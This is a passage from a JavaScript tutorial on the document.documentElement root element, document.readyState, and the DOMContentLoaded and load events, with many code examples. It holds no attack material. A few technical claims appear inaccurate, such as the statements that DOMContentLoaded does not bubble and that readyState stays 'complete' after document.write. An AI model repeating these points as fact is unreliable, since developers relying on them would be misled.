  document.documentElement.scrollWidth > document.documentElement.clientWidth;
```

**offsetHeight and offsetWidth:** Return the layout height and width including borders and scrollbars.

```javascript
const layoutHeight = document.documentElement.offsetHeight;
const layoutWidth = document.documentElement.offsetWidth;
```

### Scroll Position

**scrollTop and scrollLeft:** Represent the number of pixels the document is scrolled from the top and left edges.

```javascript
// Get scroll position
const scrolledFromTop = document.documentElement.scrollTop;
const scrolledFromLeft = document.documentElement.scrollLeft;

// Calculate scroll percentage
const scrollPercentage = 
  (document.documentElement.scrollTop / 
  (document.documentElement.scrollHeight - document.documentElement.clientHeight)) * 100;

// Detect if scrolled to bottom
const isAtBottom = 
  document.documentElement.scrollHeight - document.documentElement.scrollTop === 
  document.documentElement.clientHeight;
```

**Setting scroll position:**

```javascript
// Instant scroll
document.documentElement.scrollTop = 1000;

// Scroll to specific element
const element = document.getElementById('target');
const elementTop = element.offsetTop;
document.documentElement.scrollTop = elementTop;

// Animated scroll
function smoothScrollTo(targetPosition, duration) {
  const startPosition = document.documentElement.scrollTop;
  const distance = targetPosition - startPosition;
  let startTime = null;
  
  function animation(currentTime) {
    if (!startTime) startTime = currentTime;
    const timeElapsed = currentTime - startTime;
    const progress = Math.min(timeElapsed / duration, 1);
    
    document.documentElement.scrollTop = startPosition + (distance * progress);
    
    if (progress < 1) {
      requestAnimationFrame(animation);
    }
  }
  
  requestAnimationFrame(animation);
}

smoothScrollTo(500, 1000); // Scroll to 500px over 1 second
```

### Browser Compatibility Considerations

In older browsers, particularly older versions of Internet Explorer, scroll position might need to be accessed from `document.body` instead of `document.documentElement`:

```javascript
// Cross-browser scroll position
function getScrollTop() {
  return document.documentElement.scrollTop || document.body.scrollTop || 0;
}

function setScrollTop(value) {
  document.documentElement.scrollTop = value;
  document.body.scrollTop = value; // Fallback for older browsers
}
```

Modern browsers consistently use `document.documentElement.scrollTop`.

### Styling the Root Element

Direct style manipulation:

```javascript
// Set inline styles
document.documentElement.style.fontSize = '16px';
document.documentElement.style.backgroundColor = '#f0f0f0';
document.documentElement.style.overflow = 'hidden'; // Prevent scrolling

// Multiple styles
Object.assign(document.documentElement.style, {
  fontSize: '16px',
  lineHeight: '1.5',
  fontFamily: 'Arial, sans-serif'
});
```

**Preventing scroll:**

```javascript
// Disable scrolling
document.documentElement.style.overflow = 'hidden';

// Re-enable scrolling
document.documentElement.style.overflow = '';

// Prevent scroll while allowing scrollbar space (no layout shift)
document.documentElement.style.overflowY = 'scroll';
document.documentElement.style.position = 'fixed';
document.documentElement.style.width = '100%';
```

### Event Listeners on Root Element

Attaching global event listeners:

```javascript
// Click listener on entire document
document.documentElement.addEventListener('click', (event) => {
  console.log('Clicked at:', event.clientX, event.clientY);
});

// Scroll listener
document.documentElement.addEventListener('scroll', (event) => {
  console.log('Scroll position:', document.documentElement.scrollTop);
});

// Keyboard events
document.documentElement.addEventListener('keydown', (event) => {
  if (event.key === 'Escape') {
    console.log('Escape pressed');
  }
});
```

Note that for scroll events, it's more common to listen on `window` or `document`:

```javascript
// Preferred for scroll events
window.addEventListener('scroll', () => {
  console.log('Scrolled');
});
```

### Relationship with window Object

The `window` object properties related to viewport and scrolling often reference `document.documentElement`:

```javascript
// These are related but not identical
console.log(window.innerHeight); // Viewport height including scrollbar
console.log(document.documentElement.clientHeight); // Viewport height excluding scrollbar

// Scroll position
console.log(window.scrollY); // Same as document.documentElement.scrollTop
console.log(window.pageYOffset); // Same as document.documentElement.scrollTop (legacy)
```

### XML Documents

For XML documents, `document.documentElement` returns the root element of that XML structure, which may not be an `<html>` element:

```javascript
// Example with SVG (which is XML-based)
const svgDoc = document.implementation.createDocument(
  'http://www.w3.org/2000/svg', 
  'svg', 
  null
);

console.log(svgDoc.documentElement.nodeName); // "svg"
```

### Computed Styles

Retrieving computed styles from the root element:

```javascript
const rootStyles = getComputedStyle(document.documentElement);

// Get specific computed values
const fontSize = rootStyles.fontSize;
const backgroundColor = rootStyles.backgroundColor;
const lineHeight = rootStyles.lineHeight;

// Get CSS custom property
const primaryColor = rootStyles.getPropertyValue('--primary-color').trim();
```

### Full-screen API

The root element can be used with the Fullscreen API:

```javascript
// Request fullscreen
document.documentElement.requestFullscreen()
  .then(() => console.log('Fullscreen activated'))
  .catch(err => console.error('Fullscreen error:', err));

// Exit fullscreen
document.exitFullscreen();

// Check if fullscreen
const isFullscreen = document.fullscreenElement === document.documentElement;
```

### Mutations and Observations

Observing changes to the root element:

```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.type === 'attributes') {
      console.log('Attribute changed:', mutation.attributeName);
    }
    if (mutation.type === 'childList') {
      console.log('Children changed');
    }
  });
});

observer.observe(document.documentElement, {
  attributes: true,
  attributeFilter: ['class', 'lang', 'dir'],
  childList: true,
  subtree: false
});
```

### Performance Considerations

**Reading layout properties:** Accessing properties like `scrollTop`, `clientHeight`, or `scrollHeight` may force a layout recalculation if the DOM has been modified. Batch reads together and separate them from writes to avoid layout thrashing:

```javascript
// Bad: interleaved reads and writes
element1.style.height = document.documentElement.clientHeight + 'px'; // Read
element2.style.width = document.documentElement.clientWidth + 'px';   // Read

// Good: batch reads, then writes
const height = document.documentElement.clientHeight; // Read
const width = document.documentElement.clientWidth;   // Read

element1.style.height = height + 'px'; // Write
element2.style.width = width + 'px';   // Write
```

**Caching values:** If viewport dimensions don't change frequently, cache them:

```javascript
let cachedHeight = document.documentElement.clientHeight;

window.addEventListener('resize', () => {
  cachedHeight = document.documentElement.clientHeight;
});

// Use cachedHeight instead of repeatedly reading clientHeight
```

### Practical Patterns

**Responsive font sizing:**

```javascript
function setResponsiveFontSize() {
  const width = document.documentElement.clientWidth;
  let fontSize = 16;
  
  if (width < 768) {
    fontSize = 14;
  } else if (width < 1024) {
    fontSize = 16;
  } else {
    fontSize = 18;
  }
  
  document.documentElement.style.fontSize = fontSize + 'px';
}

window.addEventListener('resize', setResponsiveFontSize);
setResponsiveFontSize(); // Initial call
```

**Scroll progress indicator:**

```javascript
function updateScrollProgress() {
  const scrollTotal = document.documentElement.scrollHeight - 
                      document.documentElement.clientHeight;
  const scrollProgress = (document.documentElement.scrollTop / scrollTotal) * 100;
  
  document.documentElement.style.setProperty('--scroll-progress', scrollProgress);
}

window.addEventListener('scroll', updateScrollProgress);
```

**Viewport-based calculations:**

```javascript
function isElementInViewport(element) {
  const rect = element.getBoundingClientRect();
  const viewportHeight = document.documentElement.clientHeight;
  const viewportWidth = document.documentElement.clientWidth;
  
  return (
    rect.top >= 0 &&
    rect.left >= 0 &&
    rect.bottom <= viewportHeight &&
    rect.right <= viewportWidth
  );
}
```

### Null Safety

`document.documentElement` is generally always available in browser environments once the document begins parsing. However, in some edge cases or non-browser environments, defensive programming may be appropriate:

```javascript
if (document.documentElement) {
  const height = document.documentElement.clientHeight;
  // Use height
}
```

In standard browser contexts with HTML documents, this check is typically unnecessary as the `<html>` element always exists.

### Integration with Modern APIs

**Intersection Observer:**

```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    console.log('Intersection ratio:', entry.intersectionRatio);
  });
}, {
  root: null, // Uses viewport (document.documentElement implicitly)
  rootMargin: '0px',
  threshold: [0, 0.5, 1]
});
```

**Resize Observer:**

```javascript
const resizeObserver = new ResizeObserver((entries) => {
  for (let entry of entries) {
    if (entry.target === document.documentElement) {
      console.log('Root element resized');
      console.log('New size:', entry.contentRect);
    }
  }
});

resizeObserver.observe(document.documentElement);
```

### Browser Compatibility

`document.documentElement` has universal support across all browsers including Internet Explorer 6+, Chrome, Firefox, Safari, Edge, and all mobile browsers. The property itself is part of the core DOM specification and has been supported since the earliest implementations of the DOM.

---

## document.readyState

### Core Property Definition

`document.readyState` is a read-only property that returns a string describing the loading state of the document. It has exactly three possible values:

- `"loading"` - document is still loading
- `"interactive"` - document has finished loading and been parsed, but sub-resources are still loading
- `"complete"` - document and all sub-resources have finished loading

### State Transition Sequence

The property transitions through states in a strict, unidirectional sequence:

```
loading → interactive → complete
```

This sequence **never reverses** and **never skips states**. Once a state is reached, the document never returns to a previous state, even if new content is dynamically added.

### Timing in Document Lifecycle

#### loading State

- Present from initial document parse
- Exists when script tags in `<head>` execute (unless deferred/async)
- DOM is being constructed
- Parser is actively processing HTML

#### interactive State

- DOM construction complete (`DOMContentLoaded` about to fire or firing)
- Document parsed and ready for DOM manipulation
- Images, stylesheets, iframes still loading
- Synchronous scripts have executed
- Deferred scripts are executing or about to execute

Transition to `interactive` happens **immediately before** the `DOMContentLoaded` event fires:

```javascript
// This sequence is guaranteed:
// 1. readyState becomes 'interactive'
// 2. readystatechange event fires with 'interactive'
// 3. DOMContentLoaded event fires
```

#### complete State

- All resources loaded: images, stylesheets, scripts, iframes
- `window.load` event about to fire or firing
- All async operations initiated by the HTML have finished

Transition to `complete` happens **immediately before** the `load` event fires.

### readystatechange Event

The `readystatechange` event fires on `document` whenever `readyState` changes:

```javascript
document.addEventListener('readystatechange', () => {
  console.log(document.readyState);
});

// Logs (depending on when listener is added):
// "loading" (if added early enough)
// "interactive"
// "complete"
```

#### Event Timing Guarantees

Critical timing relationships:

```javascript
// Guaranteed order:
// 1. readyState = 'interactive'
// 2. readystatechange event (interactive)
// 3. DOMContentLoaded event
// 4. readyState = 'complete'
// 5. readystatechange event (complete)
// 6. window load event
```

The `readystatechange` event fires **synchronously** when the state changes, meaning:

```javascript
console.log(document.readyState); // "loading"
// State changes to interactive...
// readystatechange fires synchronously here
console.log(document.readyState); // "interactive"
```

### Practical Usage Patterns

#### Conditional Initialization

Execute code immediately if DOM ready, otherwise wait:

```javascript
function init() {
  // Initialization code
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  // DOM already ready (interactive or complete)
  init();
}
```

More comprehensive pattern:

```javascript
function runWhenReady(callback) {
  if (document.readyState !== 'loading') {
    callback();
  } else {
    document.addEventListener('DOMContentLoaded', callback);
  }
}
```

#### Detecting Full Load

Wait for all resources including images:

```javascript
function runWhenComplete(callback) {
  if (document.readyState === 'complete') {
    callback();
  } else {
    window.addEventListener('load', callback);
  }
}
```

#### State-Specific Logic

Different actions based on current state:

```javascript
switch(document.readyState) {
  case 'loading':
    // DOM not ready, can't manipulate
    document.addEventListener('DOMContentLoaded', setupDOM);
    break;
  case 'interactive':
    // DOM ready, but images/resources loading
    setupDOM();
    window.addEventListener('load', setupResources);
    break;
  case 'complete':
    // Everything loaded
    setupDOM();
    setupResources();
    break;
}
```

### Script Execution Context

The value of `readyState` when a script executes depends on script placement and attributes:

#### Inline Scripts in Head

```html
<head>
  <script>
    console.log(document.readyState); // "loading"
  </script>
</head>
```

The DOM below hasn't been parsed yet.

#### Inline Scripts in Body

```html
<body>
  <!-- content -->
  <script>
    console.log(document.readyState); // "loading"
    // But DOM up to this point is accessible
  </script>
</body>
```

Still `"loading"` because parsing isn't complete.

#### Deferred Scripts

```html
<script defer src="app.js"></script>
```

Inside `app.js`:

```javascript
// readyState is "interactive"
// DOM fully parsed, but resources still loading
console.log(document.readyState); // "interactive"
```

Deferred scripts execute **after** DOM parsing but **before** `DOMContentLoaded`.

#### Async Scripts

```html
<script async src="analytics.js"></script>
```

Inside `analytics.js`:

```javascript
// readyState is unpredictable - could be any state
// Depends on when script finishes downloading
console.log(document.readyState); // "loading", "interactive", or "complete"
```

Async scripts execute whenever they finish downloading.

#### Module Scripts

```html
<script type="module" src="app.js"></script>
```

Module scripts behave like `defer` by default:

```javascript
// readyState is "interactive" or later
console.log(document.readyState);
```

### Dynamic Content and readyState

Adding content dynamically **does not** change `readyState`:

```javascript
// readyState is "complete"
document.body.innerHTML += '<img src="large-image.jpg">';
console.log(document.readyState); // Still "complete"

// New image loads, but readyState stays "complete"
```

Once `complete` is reached, it remains `complete` regardless of subsequent resource loading. The `readyState` reflects the **initial page load** lifecycle only.

### XMLHttpRequest and Fetch Relationship

The document's `readyState` is **independent** from XHR's `readyState`:

```javascript
const xhr = new XMLHttpRequest();
console.log(xhr.readyState); // XHR state (0-4)
console.log(document.readyState); // Document state ("loading", etc.)

// These are completely separate properties with different semantics
```

Similarly, `fetch()` has no relation to `document.readyState`.

### iframe Considerations

Each iframe has its own `document` with its own `readyState`:

```javascript
const iframe = document.querySelector('iframe');

console.log(document.readyState); // Parent document state
console.log(iframe.contentDocument.readyState); // iframe document state

// These progress independently
```

#### Monitoring iframe Load

```javascript
iframe.addEventListener('load', () => {
  // iframe's readyState is now "complete"
  console.log(iframe.contentDocument.readyState); // "complete"
});

// Or monitor the iframe document directly
iframe.contentDocument.addEventListener('readystatechange', () => {
  console.log('iframe state:', iframe.contentDocument.readyState);
});
```

### History Navigation Impact

When navigating back/forward using browser history:

- `readyState` goes through the full cycle again
- Transitions from `loading` → `interactive` → `complete`
- Cached pages may transition faster, but still follow the sequence
- `pageshow` event indicates page displayed (may be from cache)

#### BFCache (Back-Forward Cache)

Pages restored from BFCache:

```javascript
window.addEventListener('pageshow', (event) => {
  if (event.persisted) {
    // Page restored from BFCache
    console.log(document.readyState); // "complete"
    // readyState is already complete, no transitions occur
  }
});
```

### Service Worker Interaction

Service Workers can intercept requests but don't affect `readyState` transitions:

```javascript
// In service worker
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request)
      .then(response => response || fetch(event.request))
  );
});

// In page: readyState transitions normally
// Even if all resources served from cache via SW
```

The browser still considers resources "loaded" when SW responds, progressing `readyState` appropriately.

### Performance API Correlation

`readyState` transitions correlate with Performance API timings:

```javascript
window.addEventListener('load', () => {
  const perfData = performance.timing;
  
  // readyState: loading → interactive happened at:
  console.log(perfData.domInteractive);
  
  // readyState: interactive → complete happened at:
  console.log(perfData.domComplete);
  
  // load event fired at:
  console.log(perfData.loadEventStart);
});
```

More modern API:

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log(entry.name, entry.startTime);
  }
});

observer.observe({ entryTypes: ['navigation'] });

// Provides domInteractive, domComplete timestamps
```

### Security and Cross-Origin

Accessing `readyState` of cross-origin iframes throws a security error:

```javascript
const iframe = document.querySelector('iframe'); // cross-origin
try {
  console.log(iframe.contentDocument.readyState);
} catch (e) {
  // SecurityError: Blocked a frame with origin...
}
```

Same-origin policy applies strictly to iframe document access.

### Testing and Debugging Strategies

#### Simulating Different States

Force execution at specific states for testing:

```javascript
// Test loading state - put at top of head
if (document.readyState === 'loading') {
  // Test code that needs loading state
}

// Test interactive state - use DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {
  console.log(document.readyState); // "interactive"
  // Test interactive-specific code
});

// Test complete state - use load
window.addEventListener('load', () => {
  console.log(document.readyState); // "complete"
  // Test complete-specific code
});
```

#### DevTools Monitoring

Monitor state changes in console:

```javascript
const originalState = document.readyState;
console.log('Initial state:', originalState);

document.addEventListener('readystatechange', () => {
  console.log('State changed to:', document.readyState);
});

document.addEventListener('DOMContentLoaded', () => {
  console.log('DOMContentLoaded - state:', document.readyState);
});

window.addEventListener('load', () => {
  console.log('load - state:', document.readyState);
});
```

#### Slow Network Testing

Use DevTools network throttling to observe states:

- Fast 3G: Clear state transitions visible
- Slow 3G: Long `loading` and `interactive` periods
- Offline: Stuck in `loading` for network resources

### Edge Cases and Quirks

#### document.write After Load

Calling `document.write()` after `complete` reopens the document:

```javascript
window.addEventListener('load', () => {
  console.log(document.readyState); // "complete"
  
  document.write('<h1>New content</h1>');
  
  // Document reopened and cleared
  console.log(document.readyState); // "complete" (remains, but doc cleared)
});
```

The `readyState` stays `complete` but the document is replaced.

#### Long-Running Requests

Resources that take extremely long to load:

```javascript
// Image never finishes loading due to server stalling
const img = new Image();
img.src = 'https://example.com/stalling-image.jpg';
document.body.appendChild(img);

// readyState will still reach "complete" after a timeout
// Browser has internal timeout for resource loading
```

Browsers implement timeouts to prevent indefinite `loading`/`interactive` states.

#### Programmatic Navigation

When using `location.href` or `history.pushState`:

```javascript
// pushState - no reload
history.pushState({}, '', '/new-url');
console.log(document.readyState); // "complete" (unchanged)

// location.href - full reload
location.href = '/new-page';
// readyState cycles through loading → interactive → complete again
```

### Polyfill Considerations

`document.readyState` is well-supported (IE9+), but for ancient browsers:

```javascript
// IE8 and below workaround
if (document.readyState === undefined) {
  document.readyState = 'loading';
  
  document.addEventListener('DOMContentLoaded', () => {
    document.readyState = 'interactive';
  });
  
  window.addEventListener('load', () => {
    document.readyState = 'complete';
  });
}
```

Modern development rarely needs this.

### Framework Integration

#### React

React typically doesn't need `readyState` checks since it mounts after DOM ready:

```javascript
// React 18
import { createRoot } from 'react-dom/client';

const root = createRoot(document.getElementById('root'));
root.render(<App />);

// This script is usually defer/module, so readyState is already "interactive"
```

#### Vue

Vue's mounting behavior:

```javascript
import { createApp } from 'vue';

// If script is defer/module, DOM is ready
createApp(App).mount('#app');

// If not sure, wrap:
if (document.readyState !== 'loading') {
  createApp(App).mount('#app');
} else {
  document.addEventListener('DOMContentLoaded', () => {
    createApp(App).mount('#app');
  });
}
```

### Best Practices Summary

1. **Prefer specific events over polling**: Use `DOMContentLoaded` and `load` rather than repeatedly checking `readyState`
    
2. **Check state before adding listeners**: Avoid missed events by checking current state first
    
3. **Use for progressive enhancement**: Check state to add features as they become available
    
4. **Don't rely on state after dynamic changes**: `readyState` only reflects initial page load
    
5. **Combine with Performance API**: Use `readyState` for logic, Performance API for metrics

---

## DOMContentLoaded vs load Events

### DOMContentLoaded Event

Fires when the HTML document has been completely parsed and the DOM tree is fully constructed, without waiting for stylesheets, images, or subframes to finish loading.

**Basic Characteristics**

```javascript
document.addEventListener('DOMContentLoaded', (event) => {
  // DOM is ready, safe to manipulate
  console.log('DOM fully parsed');
});

// Properties
event.bubbles;           // false
event.cancelable;        // false
event.composed;          // false
event.target;            // document
```

**Timing**

```javascript
// Fires after:
// - HTML parsing complete
// - DOM tree constructed
// - Synchronous scripts executed
// - Deferred scripts executed

// Fires before:
// - Images loaded
// - Stylesheets loaded (with exception, see below)
// - Iframes loaded
// - window.onload
```

**Script Blocking Behavior**

```javascript
// Synchronous scripts block DOMContentLoaded
<script src="sync.js"></script>
// DOMContentLoaded waits for sync.js to download and execute

// Async scripts do NOT block
<script async src="async.js"></script>
// DOMContentLoaded can fire before async.js completes

// Defer scripts DO block
<script defer src="defer.js"></script>
// DOMContentLoaded waits for all deferred scripts

// Module scripts behave like defer
<script type="module" src="module.js"></script>
// DOMContentLoaded waits for module execution
```

**Stylesheet Interaction**

Stylesheets block DOMContentLoaded only if there are scripts after them:

```html
<!-- Case 1: Stylesheet does NOT block DOMContentLoaded -->
<link rel="stylesheet" href="styles.css">
<!-- No scripts after, DOMContentLoaded can fire before CSS loads -->

<!-- Case 2: Stylesheet DOES block DOMContentLoaded -->
<link rel="stylesheet" href="styles.css">
<script src="script.js"></script>
<!-- Script waits for stylesheet, DOMContentLoaded waits for script -->

<!-- Case 3: Stylesheet does NOT block -->
<link rel="stylesheet" href="styles.css">
<script async src="script.js"></script>
<!-- Async script doesn't block, so stylesheet doesn't block -->
```

**Registration After Event Fires**

```javascript
// If DOMContentLoaded already fired, listener never executes
document.addEventListener('DOMContentLoaded', () => {
  console.log('This may never run if added too late');
});

// Safe alternative: check readyState
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initFunction);
} else {
  // DOM already loaded, run immediately
  initFunction();
}

// Or more concise
function ready(fn) {
  if (document.readyState !== 'loading') {
    fn();
  } else {
    document.addEventListener('DOMContentLoaded', fn);
  }
}

ready(() => {
  console.log('DOM ready');
});
```

**Event Target**

```javascript
// Only fires on document
document.addEventListener('DOMContentLoaded', handler);

// Does NOT bubble to window
window.addEventListener('DOMContentLoaded', handler); // Won't fire

// Use capturing on window if needed
window.addEventListener('DOMContentLoaded', handler, true); // Works
```

**Common Use Cases**

```javascript
// 1. Safe DOM manipulation
document.addEventListener('DOMContentLoaded', () => {
  const button = document.getElementById('myButton');
  button.addEventListener('click', handleClick);
});

// 2. Initialize libraries
document.addEventListener('DOMContentLoaded', () => {
  initializeTooltips();
  setupFormValidation();
});

// 3. Read layout information
document.addEventListener('DOMContentLoaded', () => {
  const height = element.offsetHeight; // Safe to read
});
```

### load Event

Fires when the entire page and all dependent resources (stylesheets, images, iframes, scripts) have finished loading.

**Basic Characteristics**

```javascript
window.addEventListener('load', (event) => {
  // Everything loaded
  console.log('Page fully loaded');
});

// Properties
event.bubbles;           // false
event.cancelable;        // false
event.target;            // window, document, or specific element
```

**Timing**

```javascript
// Fires after:
// - DOMContentLoaded
// - All stylesheets loaded
// - All images loaded
// - All iframes loaded
// - All synchronous, async, and deferred scripts loaded
// - All other subresources loaded

// Order of events
document.addEventListener('DOMContentLoaded', () => {
  console.log('1. DOM ready');
});

window.addEventListener('load', () => {
  console.log('2. Everything loaded');
});
```

**Event Targets**

```javascript
// window.onload - entire page
window.addEventListener('load', () => {
  console.log('Page loaded');
});

// document.onload - not standard, avoid
document.addEventListener('load', () => {
  // This is unreliable, use window or DOMContentLoaded
});

// Element-specific load events
const img = document.querySelector('img');
img.addEventListener('load', () => {
  console.log('Image loaded:', img.width, img.height);
});

const iframe = document.querySelector('iframe');
iframe.addEventListener('load', () => {
  console.log('Iframe content loaded');
});

const script = document.createElement('script');
script.addEventListener('load', () => {
  console.log('Script loaded and executed');
});
script.src = 'external.js';
document.head.appendChild(script);

const link = document.createElement('link');
link.addEventListener('load', () => {
  console.log('Stylesheet loaded');
});
link.rel = 'stylesheet';
link.href = 'styles.css';
document.head.appendChild(link);
```

**Registration After Event Fires**

```javascript
// Similar issue as DOMContentLoaded
if (document.readyState === 'complete') {
  // Already loaded
  initFunction();
} else {
  window.addEventListener('load', initFunction);
}
```

**Common Use Cases**

```javascript
// 1. Work with image dimensions
window.addEventListener('load', () => {
  const img = document.querySelector('img');
  console.log('Image size:', img.naturalWidth, img.naturalHeight);
});

// 2. Initialize features requiring full layout
window.addEventListener('load', () => {
  createFullScreenCanvas();
  calculateComplexLayout();
});

// 3. Analytics and performance monitoring
window.addEventListener('load', () => {
  const loadTime = performance.now();
  sendAnalytics({ pageLoadTime: loadTime });
});

// 4. Lazy load additional content
window.addEventListener('load', () => {
  loadNonCriticalResources();
});
```

### document.readyState

Property that tracks document loading state, provides alternative to events:

```javascript
document.readyState; // "loading", "interactive", or "complete"

// "loading" - document still loading
// "interactive" - DOM ready, resources still loading (DOMContentLoaded about to fire)
// "complete" - everything loaded (load event about to fire)

// readystatechange event
document.addEventListener('readystatechange', () => {
  console.log(document.readyState);
  
  if (document.readyState === 'interactive') {
    // Same timing as DOMContentLoaded
    initDOM();
  }
  
  if (document.readyState === 'complete') {
    // Same timing as window.onload
    initFull();
  }
});
```

**Timing Correlation**

```javascript
// State transitions:
// 1. "loading" - initial state
// 2. "interactive" - triggers immediately before DOMContentLoaded
// 3. "complete" - triggers immediately before window.load

// Typical sequence:
document.addEventListener('readystatechange', () => {
  console.log('State:', document.readyState);
});

document.addEventListener('DOMContentLoaded', () => {
  console.log('DOMContentLoaded');
  // document.readyState is "interactive"
});

window.addEventListener('load', () => {
  console.log('load');
  // document.readyState is "complete"
});

// Output order:
// State: loading (initial)
// State: interactive
// DOMContentLoaded
// State: complete
// load
```

### Comparison Table

|Aspect|DOMContentLoaded|load|
|---|---|---|
|Event target|`document`|`window` (also element-specific)|
|Bubbles|No|No|
|Waits for HTML parsing|Yes|Yes|
|Waits for DOM construction|Yes|Yes|
|Waits for sync scripts|Yes|Yes|
|Waits for deferred scripts|Yes|Yes|
|Waits for async scripts|No|Yes|
|Waits for stylesheets|Conditional|Yes|
|Waits for images|No|Yes|
|Waits for iframes|No|Yes|
|Waits for fonts|No|Yes|
|Associated readyState|"interactive"|"complete"|
|Can be canceled|No|No|
|Typical use|DOM manipulation|Resource-dependent initialization|

### Performance Implications

```javascript
// DOMContentLoaded - Earlier, better for UX
document.addEventListener('DOMContentLoaded', () => {
  // Runs sooner, allows faster interactivity
  initializeUI();
  attachEventListeners();
  // User can start interacting while images still load
});

// load - Later, ensures everything available
window.addEventListener('load', () => {
  // Runs after all resources loaded
  // May delay interactivity unnecessarily
  initializeUI(); // Could have run earlier with DOMContentLoaded
});

// Measure timing difference
let domTime, loadTime;

document.addEventListener('DOMContentLoaded', () => {
  domTime = performance.now();
});

window.addEventListener('load', () => {
  loadTime = performance.now();
  console.log(`DOMContentLoaded: ${domTime}ms`);
  console.log(`load: ${loadTime}ms`);
  console.log(`Difference: ${loadTime - domTime}ms`);
});
```

**Performance Monitoring**

```javascript
// Navigation Timing API provides precise measurements
window.addEventListener('load', () => {
  const perfData = performance.timing;
  const pageLoadTime = perfData.loadEventEnd - perfData.navigationStart;
  const domReadyTime = perfData.domContentLoadedEventEnd - perfData.navigationStart;
  const resourceLoadTime = perfData.loadEventEnd - perfData.domContentLoadedEventEnd;
  
  console.log('DOM Ready:', domReadyTime, 'ms');
  console.log('Full Load:', pageLoadTime, 'ms');
  console.log('Resources:', resourceLoadTime, 'ms');
});

// Modern Performance API
window.addEventListener('load', () => {
  const [navEntry] = performance.getEntriesByType('navigation');
  console.log('DOM Content Loaded:', navEntry.domContentLoadedEventEnd);
  console.log('Load Complete:', navEntry.loadEventEnd);
  console.log('DOM Interactive:', navEntry.domInteractive);
});
```

### Script Loading Strategies Impact

```javascript
// Strategy 1: Traditional blocking script (slowest)
<script src="app.js"></script>
// - Blocks HTML parsing
// - Blocks DOMContentLoaded
// - Loads and executes immediately

// Strategy 2: Defer (recommended for order-dependent scripts)
<script defer src="app.js"></script>
// - Doesn't block HTML parsing
// - Blocks DOMContentLoaded
// - Executes in order before DOMContentLoaded

// Strategy 3: Async (fastest, order-independent)
<script async src="analytics.js"></script>
// - Doesn't block HTML parsing
// - Doesn't block DOMContentLoaded
// - Executes whenever ready, no guaranteed order

// Strategy 4: Module scripts (modern approach)
<script type="module" src="app.js"></script>
// - Behaves like defer by default
// - Doesn't block HTML parsing
// - Blocks DOMContentLoaded
// - Supports ES6 imports
```

**Practical Example**

```html
<!DOCTYPE html>
<html>
<head>
  <!-- CSS loads (blocks scripts after it) -->
  <link rel="stylesheet" href="styles.css">
  
  <!-- Defer script waits for CSS, runs before DOMContentLoaded -->
  <script defer src="main.js"></script>
  
  <!-- Async script runs whenever ready -->
  <script async src="analytics.js"></script>
</head>
<body>
  <img src="large-image.jpg">
  
  <script>
    // Inline script blocks DOMContentLoaded
    console.log('Inline script executed');
    
    document.addEventListener('DOMContentLoaded', () => {
      console.log('DOM ready');
      // defer scripts have executed
      // async scripts may or may not have executed
      // CSS loaded
      // Image may not be loaded yet
    });
    
    window.addEventListener('load', () => {
      console.log('Everything loaded');
      // All scripts executed
      // All resources loaded including image
    });
  </script>
</body>
</html>
```

### Edge Cases and Gotchas

**Empty Documents**

```javascript
// Empty or minimal documents
<!DOCTYPE html><html><head></head><body></body></html>

// DOMContentLoaded fires almost immediately
// load also fires quickly (no resources to load)
```

**Infinite Loading**

```javascript
// If a resource never finishes loading
<img src="http://never-responds.example.com/image.jpg">

// DOMContentLoaded fires normally (doesn't wait for images)
// window.load may never fire (waits for all resources)

// [Inference] Browser timeout mechanisms may eventually trigger load event
// after extended period, but this behavior is not guaranteed
```

**Dynamic Content Loading**

```javascript
document.addEventListener('DOMContentLoaded', () => {
  // Add image after DOMContentLoaded
  const img = document.createElement('img');
  img.src = 'dynamic.jpg';
  document.body.appendChild(img);
  
  // This image load won't prevent window.load if added after DOMContentLoaded
  // but will delay it if added before
});

window.addEventListener('load', () => {
  // May or may not include dynamically added image
  // depending on timing
});
```

**Multiple Registrations**

```javascript
// Both handlers execute
document.addEventListener('DOMContentLoaded', handler1);
document.addEventListener('DOMContentLoaded', handler2);

// Execution order is registration order
// handler1 runs, then handler2
```

**Removing Listeners**

```javascript
function handler() {
  console.log('DOM ready');
}

document.addEventListener('DOMContentLoaded', handler);
document.removeEventListener('DOMContentLoaded', handler);
// Handler won't execute even if removed before event fires
```

### jQuery's $(document).ready() Equivalent

For context, jQuery's popular pattern:

```javascript
// jQuery (for reference)
$(document).ready(function() {
  // DOM ready
});

// Vanilla JavaScript equivalent
document.addEventListener('DOMContentLoaded', function() {
  // DOM ready
});

// Or with the safety check
function ready(fn) {
  if (document.readyState !== 'loading') {
    fn();
  } else {
    document.addEventListener('DOMContentLoaded', fn);
  }
}

ready(function() {
  // DOM ready, works even if called after DOMContentLoaded
});
```

### Modern Best Practices

```javascript
// 1. Use defer for scripts (most common)
<script defer src="app.js"></script>
// No need for DOMContentLoaded, script runs when DOM ready

// 2. Use type="module" for modern code
<script type="module" src="app.js"></script>
// Automatically deferred, supports ES6 imports

// 3. Only use window.load when necessary
window.addEventListener('load', () => {
  // Only for truly resource-dependent code
  analyzeImageDimensions();
  measureLayoutMetrics();
});

// 4. Avoid inline scripts at bottom of body
// (Legacy pattern, defer is better)
<body>
  <!-- content -->
  <script src="app.js"></script> // Old way
</body>

// Better:
<head>
  <script defer src="app.js"></script> // Modern way
</head>

// 5. Lazy load non-critical resources
document.addEventListener('DOMContentLoaded', () => {
  // Critical initialization
  initCore();
  
  // Defer non-critical work
  requestIdleCallback(() => {
    initNonCritical();
  });
});
```

### Debugging Event Timing

```javascript
// Comprehensive timing debug
const events = [];

['readystatechange', 'DOMContentLoaded'].forEach(eventType => {
  document.addEventListener(eventType, () => {
    events.push({
      type: eventType,
      time: performance.now(),
      readyState: document.readyState
    });
  });
});

['load'].forEach(eventType => {
  window.addEventListener(eventType, () => {
    events.push({
      type: eventType,
      time: performance.now(),
      readyState: document.readyState
    });
    
    console.table(events);
  });
});

// Check current state at any time
function checkLoadingState() {
  return {
    readyState: document.readyState,
    domReady: document.readyState !== 'loading',
    fullyLoaded: document.readyState === 'complete'
  };
}
```

### Cross-Browser Considerations

